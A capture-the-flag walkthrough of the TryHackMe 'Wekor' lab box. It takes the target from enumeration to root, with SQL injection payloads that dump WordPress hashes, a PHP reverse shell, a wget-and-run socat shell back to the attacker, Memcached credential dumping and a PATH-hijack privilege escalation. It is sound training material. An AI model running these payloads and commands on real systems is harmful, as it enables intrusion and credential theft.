# Wekor

## Introduction

Welcome to my another writeup! In this TryHackMe [Wekor](https://tryhackme.com/room/wekorra) room, you'll learn: subdomain enumeration, directory enumeration, WordPress enumeration, SQL injection, Memcached, exploiting relative path, and more! Without further ado, let's dive in.

## Background

> CTF challenge involving Sqli , WordPress , vhost enumeration and recognizing internal services ;) 

> Difficulty: Medium 

```
Hey Everyone! This Box is just a little CTF I've prepared recently. I hope you enjoy it as it is my first time ever creating something like this !

This CTF is focused primarily on enumeration, better understanding of services and thinking out of the box for some parts of this machine.

Feel free to ask any questions...It's okay to be confused in some parts of the box ;)

Just a quick note, Please use the domain : "wekor.thm" as it could be useful later on in the box ;)
```

- Overall difficulty for me: Medium
    - Initial foothold: Easy
    - Privilege escalation: Medium

# Service Enumeration

**Adding domain `wekor.thm` to `/etc/hosts`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Wekor]
└─# export RHOSTS=10.10.10.35  
                                                                                                 
┌──(root🌸siunam)-[~/ctf/thm/ctf/Wekor]
└─# echo "$RHOSTS wekor.thm" | tee -a /etc/hosts                                
10.10.10.35 wekor.thm
```

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Wekor]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 95:c3:ce:af:07:fa:e2:8e:29:04:e4:cd:14:6a:21:b5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDn0l/KSmAk6LfT9R73YXvsc6g8qGZvMS+A5lJ19L4G5xbhSpCoEN0kBEZZQfI80sEU7boAfD0/VcdFhURkPxDUdN1wN7a/4alpMMMKf2ey0tpnWTn9nM9JVVI9rloaiD8nIuLesjigq+eEQCaEijfArUtzAJpESwRHrtm2OWTJ+PYNt1NDIbQm1HJHPasD7Im/wW6MF04mB04UrTwhWBHV4lziH7Rk8DYOI1xxfzz7J8bIatuWaRe879XtYA0RgepMzoXKHfLXrOlWJusPtMO2x+ATN2CBEhnNzxiXq+2In/RYMu58uvPBeabSa74BthiucrdJdSwobYVIL27kCt89
|   256 4d:99:b5:68:af:bb:4e:66:ce:72:70:e6:e3:f8:96:a4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKJLaFNlUUzaESL+JpUKy/u7jH4OX+57J/GtTCgmoGOg4Fh8mGqS8r5HAgBMg/Bq2i9OHuTMuqazw//oQtRYOhE=
|   256 0d:e5:7d:e8:1a:12:c0:dd:b7:66:5e:98:34:55:59:f6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJvvZ5IaMI7DHXHlMkfmqQeKKGHVMSEYbz0bYhIqPp62
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 9 disallowed entries 
| /workshop/ /root/ /lol/ /agent/ /feed /crawler /boot 
|_/comingreallysoon /interesting
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP on Port 80

**In the `nmap` scripting engine scanning, we can see there is a `robots.txt` crawler file in `wekor.thm` domain:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Wekor]
└─# curl http://wekor.thm/robots.txt
User-agent: *
Disallow: /workshop/
Disallow: /root/
Disallow: /lol/
Disallow: /agent/
Disallow: /feed
Disallow: /crawler
Disallow: /boot
Disallow: /comingreallysoon
Disallow: /interesting
```

**We can use `gobuster` to bruteforce those hidden directory:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Wekor]
└─# cat << EOF > robots.txt    
heredoc> /workshop/
/root/
/lol/
/agent/
/feed
/crawler
/boot
/comingreallysoon
/interesting
heredoc> EOF
                                                                                                 
┌──(root🌸siunam)-[~/ctf/thm/ctf/Wekor]
└─# gobuster dir -u http://wekor.thm/ -w robots.txt -t 100              
[...]
//comingreallysoon    (Status: 301) [Size: 317] [--> http://wekor.thm/comingreallysoon/]
```

**Found `/comingreallysoon/` directory.**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Wekor]
└─# curl http://wekor.thm/comingreallysoon/
Welcome Dear Client!

We've setup our latest website on /it-next, Please go check it out!

If you have any comments or suggestions, please tweet them to @faketwitteraccount!

Thanks a lot !
```

**Another directory called `/it-next`?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Wekor/images/a1.png)

Not sure it's a rabbit hole or not.

**Fuzzing subdomain via `ffuf`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Wekor]
└─# ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://wekor.thm/ -H 'Host: FUZZ.wekor.thm' -t 100 -fs 23 
[...]
site                    [Status: 200, Size: 143, Words: 27, Lines: 6, Duration: 400ms]
```

- Found subdomain: `site`

**Add new subdomain to `/etc/hosts`:**
```
10.10.10.35 wekor.thm site.wekor.thm
```

**site.wekor.thm:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Wekor]
└─# curl http://site.wekor.thm/   
Hi there!

Nothing here for now, but there should be an amazing website here in about 2 weeks, SO DON'T FORGET TO COME BACK IN 2 WEEKS!

- Jim
```

`there should be an amazing website here in about 2 weeks`... Let's use `gobuster` to find hidden directory:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Wekor]
└─# gobuster dir -u http://site.wekor.thm/ -w /usr/share/wordlists/dirb/big.txt -t 100 
[...]
/wordpress            (Status: 301) [Size: 320] [--> http://site.wekor.thm/wordpress/]
```

**Found directory `/wordpress/`!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Wekor/images/a2.png)

**Let's use `wpscan` to scan this WordPress site!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Wekor]
└─# wpscan --url http://site.wekor.thm/wordpress/
[...]
[+] WordPress version 5.6 identified (Insecure, released on 2020-12-08).
[...]
[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://site.wekor.thm/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

- Found user: `admin`

I tried to bruteforce it, but no luck.

**In this WordPress page, I found a form that allows you to send a GET request to search posts via `s` parameter:**
```html
<aside class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search"  method="get" class="search-form" action="http://site.wekor.thm/wordpress/">
	<label for="search-form-1">Search&hellip;</label>
	<input type="search" id="search-form-1" class="search-field" value="" name="s" />
	<input type="submit" class="search-submit" value="Search" />
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Wekor/images/a3.png)

However, I don't think it's vulnerable to SQL injection...

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Wekor/images/a4.png)

Hmm... Let's go back to `wekor.thm/it-next/` page:

**By enumerating that page, I found the `/it-next/it_cart.php`'s "Apply Coupon" is vulnerable to SQL Injection!!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Wekor/images/a5.png)

We can now try to confirm it's vulnerable to which type of SQL Injection:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Wekor/images/a6.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Wekor/images/a7.png)

**It's clear that it's vulnerable to Union-based SQL injection!!**

> Note: Since I'm practicing OSCP exam, I'll exploit it manually.

The first step of exploiting SQL injection is **determine which DBMS is the system using**:

**Let's try MySQL first!**
```sql
' UNION ALL SELECT NULL,NULL,version()-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Wekor/images/a8.png)

Found it! **It's using MySQL version 5.7.32-0ubuntu0.16.04.1!** 

Armed with this information, we can enumerate the database!

**Enumerate all database names:**
```sql
' UNION ALL SELECT NULL,NULL,schema_name FROM information_schema.schemata-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Wekor/images/a9.png)

- Found database names:
	- coupons
	- wordpress

The `wordpress` database would be the initial foothold attack vector!! Since it'll store users credentials!

**Enumerate database `wordpress` table names:**
```sql
' UNION ALL SELECT NULL,NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='wordpress'-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Wekor/images/a10.png)

- Database `wordpress` table names:
	- wp_commentmeta
	- wp_comments
	- wp_links
	- wp_options
	- wp_postmeta
	- wp_posts
	- wp_term_relationships
	- wp_term_taxonomy
	- wp_termmeta
	- wp_terms
	- wp_usermeta
	- wp_users

The `wp_users` table looks interesting! Let's find out the column names of that table!

**Enumerate database `wordpress` table `wp_users`'s column names:**
```sql
' UNION ALL SELECT NULL,NULL,concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='wp_users'-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Wekor/images/a11.png)

- Database `wordpress` table `wp_users` column names:
	- user_login
	- user_pass
	- user_nicename
	- user_email
	- user_url
	- user_registered
	- user_activation_key
	- user_status
	- display_name

Let's retrieve some credentials!

**Retrieve data from database `wordpress` table `wp_users`:**
```sql
' UNION ALL SELECT NULL,NULL,concat(user_login,0x3a,user_pass) FROM wordpress.wp_users-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Wekor/images/a12.png)

> Note: `0x3a` means `:`.

**Credentials:**
```
admin:$P${Redacted}
wp_jeffrey:$P${Redacted}
wp_yura:$P${Redacted}
wp_eagle:$P${Redacted}
```

# Initial Foothold

Hmm... **The user `admin` sounds like having administrator level in `site.wekor.thm`'s WordPress. Let's crack his hash via `john`!**

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Wekor]
└─# nano admin.hash 

┌──(root🌸siunam)-[~/ctf/thm/ctf/Wekor]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt admin.hash 
Using default input encoding: UTF-8
No password hashes loaded (see FAQ)
```

**Wait. Not loaded? Let me check it's hash type via `hash-identifier`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Wekor]
└─# hash-identifier 
[...]
 HASH: $P${Redacted}

 Not Found.
```

Hmm... That weird. **How about other 3 users hash?**

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Wekor]
└─# hash-identifier 
[...]
 HASH: $P${Redacted}

Possible Hashs:
[+] MD5(Wordpress)
--------------------------------------------------
 HASH: $P${Redacted}

Possible Hashs:
[+] MD5(Wordpress)
--------------------------------------------------
 HASH: $P${Redacted}

Possible Hashs:
[+] MD5(Wordpress)
--------------------------------------------------
```

**Looks like all the hashes are crackable except the `admin` one. Let's crack all of them!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Wekor]
└─# nano wordpress.hash
                                                                                       
┌──(root🌸siunam)-[~/ctf/thm/ctf/Wekor]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt wordpress.hash  
[...]
{Redacted}          (wp_jeffrey)     
{Redacted}           (wp_eagle)     
{Redacted}         (wp_yura) 
```

**Successfully cracked! Let's login to the WordPress in `site.wekor.thm/wordpress/wp-login.php`:**

**User `wp_jeffrey`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Wekor/images/a13.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Wekor/images/a14.png)

This user is NOT an administrator account.

**User `wp_eagle`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Wekor/images/a15.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Wekor/images/a16.png)

Same for user `wp_eagle`.

**User `wp_yura`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Wekor/images/a17.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Wekor/images/a18.png)

**User `wp_yura` is an administrator account!!**

**To get a reverse shell, we can:**

- Go to "Theme Editor" in "Appearance" -> choose "404 Template" -> Modify the file content to a [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) -> click "Update":

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Wekor/images/a19.png)

- Setup a `nc` listener:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Wekor]
└─# nc -lnvp 443       
listening on [any] 443 ...
```

- Trigger the PHP reverse shell:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Wekor]
└─# curl http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/404.php
```

```
[...]
connect to [10.18.61.134] from (UNKNOWN) [10.10.10.35] 47698
Linux osboxes 4.15.0-132-generic #136~16.04.1-Ubuntu SMP Tue Jan 12 18:18:45 UTC 2021 i686 i686 i686 GNU/Linux
 07:35:02 up 14 min,  0 users,  load average: 0.99, 1.19, 0.99
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1129): Inappropriate ioctl for device
bash: no job control in this shell
www-data@osboxes:/$ ip a
ip a
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:94:36:70:83:dd brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.35/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::94:36ff:fe70:83dd/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm `www-data`!

**Stable shell via `socat`:**
```
┌──(root🌸siunam)-[/opt/…/binaries/linux/x86/socat-2.0.0-b8]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

www-data@osboxes:/$ wget http://10.18.61.134/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.18.61.134:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane

┌──(root🌸siunam)-[~/ctf/thm/ctf/Wekor]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
2022/09/23 07:51:24 socat[42520] N opening character device "/dev/pts/2" for reading and writing
2022/09/23 07:51:24 socat[42520] N listening on AF=2 0.0.0.0:4444
                                                                 2022/09/23 07:51:28 socat[42520] N accepting connection from AF=2 10.10.10.35:45424 on AF=2 10.18.61.134:4444
                                                                   2022/09/23 07:51:28 socat[42520] N starting data transfer loop with FDs [5,5] and [7,7]
                                               www-data@osboxes:/$ 
www-data@osboxes:/$ stty rows 22 columns 107
www-data@osboxes:/$ export TERM=xterm-256color
www-data@osboxes:/$ ^C
www-data@osboxes:/$ 
```

# Privilege Escalation

## www-data to Orka

```
www-data@osboxes:/$ cat /etc/passwd | grep /bin/bash                      
root:x:0:0:root:/root:/bin/bash
Orka:x:1001:1001::/home/Orka:/bin/bash
```

**Found 1 user: `Orka`**

**Found MySQL credentials in `/var/www/html/site.wekor.thm/wordpress/wp-config.php`:**
```
www-data@osboxes:/var/www/html/site.wekor.thm/wordpress$ cat wp-config.php
[...]
/** MySQL database username */
define( 'DB_USER', 'root' );

/** MySQL database password */
define( 'DB_PASSWORD', '{Redacted}' );
```

Tried password reuse for user `Orka`, but no dice.

**Internal open ports:**
```
www-data@osboxes:/$ netstat -tunlp
[...]
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:3010          0.0.0.0:*               LISTEN      -   
```

In the above `netstat` command, we can see that **port 11211 and 3010 is opened at localhost**, which is very weird.

**We can use `chisel` to do dynamic port forwarding to determine what services are they running:**
```
┌──(root🌸siunam)-[/opt/chisel]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

www-data@osboxes:/$ wget http://10.18.61.134/chiselx86 -O /tmp/chisel;chmod +x /tmp/chisel
```

**Dynamic port forwarding:**
```
┌──(root🌸siunam)-[/opt/chisel]
└─# ./chiselx64 server -p 8888 --reverse

www-data@osboxes:/$ /tmp/chisel client 10.18.61.134:8888 R:socks
```

**Using `nmap` to scan those ports with `proxychains`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Wekor]
└─# proxychains nmap -sT -sC -sV -T4 -p3010,11211 127.0.0.1
[...]
PORT      STATE SERVICE   VERSION
3010/tcp  open  gw?
11211/tcp open  memcached Memcached 1.4.25 (uptime 2855 seconds; Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Hmm... **Memcached**??

> Memcached is a general-purpose distributed memory-caching system. It is often used to speed up dynamic database-driven websites by caching data and objects in RAM to reduce the number of times an external data source must be read. (Source: [Wikipedia](https://en.wikipedia.org/wiki/Memcached))

**According to [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/11211-memcache#manual), we can do some enumeration to Memcache on port 11211!**

To exfiltrate all the information saved inside a memcache instance you need to:

1. Find **slabs** with **active items**
2. Get the **key names** of the slabs detected before
3. Exfiltrate the **saved data** by **getting the key names**

Remember that this service is just a **cache**, so **data may be appearing and disappearing**.

```
echo "version" | nc -vn -w 1 127.0.0.1 11211      #Get version
echo "stats" | nc -vn -w 1 127.0.0.1 11211        #Get status
echo "stats slabs" | nc -vn -w 1 127.0.0.1 11211  #Get slabs
echo "stats items" | nc -vn -w 1 127.0.0.1 11211  #Get items of slabs with info
echo "stats cachedump <number> 0" | nc -vn -w 1 <IP> 11211  #Get key names (the 0 is for unlimited output size)
echo "get <item_name>" | nc -vn -w 1 127.0.0.1 11211  #Get saved info
```

**Get slabs:**
```
www-data@osboxes:/$ echo "stats slabs" | nc -vn -w 1 127.0.0.1 11211
Connection to 127.0.0.1 11211 port [tcp/*] succeeded!
STAT 1:chunk_size 80
STAT 1:chunks_per_page 13107
STAT 1:total_pages 1
STAT 1:total_chunks 13107
STAT 1:used_chunks 5
STAT 1:free_chunks 13102
STAT 1:free_chunks_end 0
STAT 1:mem_requested 321
STAT 1:get_hits 0
STAT 1:cmd_set 215
STAT 1:delete_hits 0
STAT 1:incr_hits 0
STAT 1:decr_hits 0
STAT 1:cas_hits 0
STAT 1:cas_badval 0
STAT 1:touch_hits 0
STAT active_slabs 1
STAT total_malloced 1048560
END
```

**Get items of slabs with info:**
```
www-data@osboxes:/$ echo "stats items" | nc -vn -w 1 127.0.0.1 11211
Connection to 127.0.0.1 11211 port [tcp/*] succeeded!
STAT items:1:number 5
STAT items:1:age 3376
STAT items:1:evicted 0
STAT items:1:evicted_nonzero 0
STAT items:1:evicted_time 0
STAT items:1:outofmemory 0
STAT items:1:tailrepairs 0
STAT items:1:reclaimed 0
STAT items:1:expired_unfetched 0
STAT items:1:evicted_unfetched 0
STAT items:1:crawler_reclaimed 0
STAT items:1:crawler_items_checked 0
STAT items:1:lrutail_reflocked 0
END
```

**Get key names:**
```
www-data@osboxes:/$ echo "stats cachedump 1 0" | nc -vn -w 1 127.0.0.1 11211
Connection to 127.0.0.1 11211 port [tcp/*] succeeded!
ITEM id [4 b; 1663932067 s]
ITEM email [14 b; 1663932067 s]
ITEM salary [8 b; 1663932067 s]
ITEM password [15 b; 1663932067 s]
ITEM username [4 b; 1663932067 s]
END
```

**`cachedump 1` has `password` and `username`!**

**Let's get the saved info:**
```
www-data@osboxes:/$ echo "get username" | nc -vn -w 1 127.0.0.1 11211
Connection to 127.0.0.1 11211 port [tcp/*] succeeded!
VALUE username 0 4
Orka
END

www-data@osboxes:/$ echo "get password" | nc -vn -w 1 127.0.0.1 11211
Connection to 127.0.0.1 11211 port [tcp/*] succeeded!
VALUE password 0 15
{Redacted}
END
```

**Found `Orka` password!**

Let's **Switch User** to `Orka`!

```
www-data@osboxes:/$ su Orka
Password: 
Orka@osboxes:/$ whoami;hostname;id;ip a
Orka
osboxes
uid=1001(Orka) gid=1001(Orka) groups=1001(Orka)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:94:36:70:83:dd brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.35/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::94:36ff:fe70:83dd/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm `Orka`!

**user.txt:**
```
Orka@osboxes:/$ cat /home/Orka/user.txt 
{Redacted}
```

## Orka to root

**Sudo permission:**
```
Orka@osboxes:/$ sudo -l
[sudo] password for Orka: 
Matching Defaults entries for Orka on osboxes:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User Orka may run the following commands on osboxes:
    (root) /home/Orka/Desktop/bitcoin
```

**User `Orka` is able to run `/home/Orka/Desktop/bitcoin` as root!**

```
Orka@osboxes:~/Desktop$ ls -lah
total 20K
drwxrwxr-x  2 root root 4.0K Jan 23  2021 .
drwxr-xr-- 18 Orka Orka 4.0K Jan 26  2021 ..
-rwxr-xr-x  1 root root 7.6K Jan 23  2021 bitcoin
-rwxr--r--  1 root root  588 Jan 23  2021 transfer.py
```

**transfer.py:**
```py
import time
import socket
import sys
import os

result = sys.argv[1]

print "Saving " + result + " BitCoin(s) For Later Use "

test = raw_input("Do you want to make a transfer? Y/N : ")

if test == "Y":
	try:
		print "Transfering " + result + " BitCoin(s) "
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		connect = s.connect(("127.0.0.1",3010))
		s.send("Transfer : " + result + "To https://transfer.bitcoins.com")
		time.sleep(2.5)
		print ("Transfer Completed Successfully...")
		time.sleep(1)
		s.close()
	except:
		print("Error!")
else:
	print("Quitting...")
	time.sleep(1)
```

**`bitcoin` binary:**
```
Orka@osboxes:~/Desktop$ file bitcoin 
bitcoin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8280915d0ebb7225ed63f226c15cee11ce960b6b, not stripped
```

Since it's **not stripped**, we can use `strings` to list all the strings in that binary:

```
Orka@osboxes:~/Desktop$ strings bitcoin 
[...]
Enter the password : 
password
Access Denied... 
Access Granted...
			User Manual:			
Maximum Amount Of BitCoins Possible To Transfer at a time : 9 
Amounts with more than one number will be stripped off! 
And Lastly, be careful, everything is logged :) 
Amount Of BitCoins : 
 Sorry, This is not a valid amount! 
python /home/Orka/Desktop/transfer.py %c
[...]
```

- Found `bitcoin` binary password: `password`

```
Orka@osboxes:~/Desktop$ ./bitcoin 
Enter the password : password
Access Granted...
			User Manual:			
Maximum Amount Of BitCoins Possible To Transfer at a time : 9 
Amounts with more than one number will be stripped off! 
And Lastly, be careful, everything is logged :) 
Amount Of BitCoins : 9
Saving 9 BitCoin(s) For Later Use 
Do you want to make a transfer? Y/N : Y
Transfering 9 BitCoin(s) 
Transfer Completed Successfully...
```

In the `strings` bitcoin binary, we see that **the `python` is NOT using an absoulte path, which could be abused to escalate to root!**

**Exploitable: (Relative path)**
```
python
```

**Not exploitable: (Absoulte path)**
```
/usr/bin/python
```

However in the sudo permission, we see the **`secure_path`**:

```
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
```

That means **we can't export our PATH environment varible outside those secure path**.

**BUT!!**
```
Orka@osboxes:/usr$ ls -lah
total 124K
drwxr-xr-x  11 root root 4.0K Feb 26  2019 .
drwxr-xr-x  23 root root 4.0K Jan 23  2021 ..
drwxr-x--x   2 root Orka  56K Jan 26  2021 bin
drwxr-xr-x   2 root root 4.0K Feb 26  2019 games
drwxr-xr-x  37 root root  16K Jan 23  2021 include
drwxr-xr-x 142 root root 4.0K Jan 26  2021 lib
drwxr-xr-x  10 root root 4.0K Feb 26  2019 local
drwxr-xr-x   3 root root 4.0K Feb 26  2019 locale
drwxrwxr-x   2 root Orka  12K Jan 23  2021 sbin
drwxr-xr-x 300 root root  12K Jan 26  2021 share
drwxr-xr-x   6 root root 4.0K Jan 23  2021 src
```

**In `/usr/bin` and `/usr/sbin`, we have the group permission**, which we can write stuff inside there!

**To exploit this relative path, I'll:**

- Create a malicious "python" Bash script that will add SUID sticky bit into `/bin/bash`, and mark it as executable:

```
Orka@osboxes:/usr/sbin$ echo "chmod +s /bin/bash" > python
Orka@osboxes:/usr/sbin$ chmod +x python
```

- Run the `bitcoin` binary with `sudo`:

```
Orka@osboxes:/usr/sbin$ sudo /home/Orka/Desktop/bitcoin
Enter the password : password
Access Granted...
			User Manual:			
Maximum Amount Of BitCoins Possible To Transfer at a time : 9 
Amounts with more than one number will be stripped off! 
And Lastly, be careful, everything is logged :) 
Amount Of BitCoins : 1
```

- Verify the exploit works:

```
Orka@osboxes:/usr/sbin$ ls -lah /bin/bash
-rwsr-sr-x 1 root root 1.1M Jul 12  2019 /bin/bash
```

Yes!! It worked! **Let's spawn a bash shell with SUID privilege!**

```
Orka@osboxes:/usr/sbin$ /bin/bash -p
bash-4.3# whoami;hostname;id;ip a
root
osboxes
uid=1001(Orka) gid=1001(Orka) euid=0(root) egid=0(root) groups=0(root),1001(Orka)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:94:36:70:83:dd brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.35/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::94:36ff:fe70:83dd/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

# Rooted

**root.txt:**
```
bash-4.3# cat /root/root.txt
{Redacted}
```

# Conclusion

What we've learned:

1. Subdomain Enumeration
2. Directory Enumeration
3. WordPress Enumeration
4. Union-Based SQL Injection
5. Hash Cracking
6. WordPress Reverse Shell
7. Dynamic Port Forwarding
8. Memcached Enumeration
9. Privilege Escalation via Cleartext Credentials in Memcached
10. Privilege Escalation via Relative Path in `bitcoin` Binary & Misconfigured Directory Permission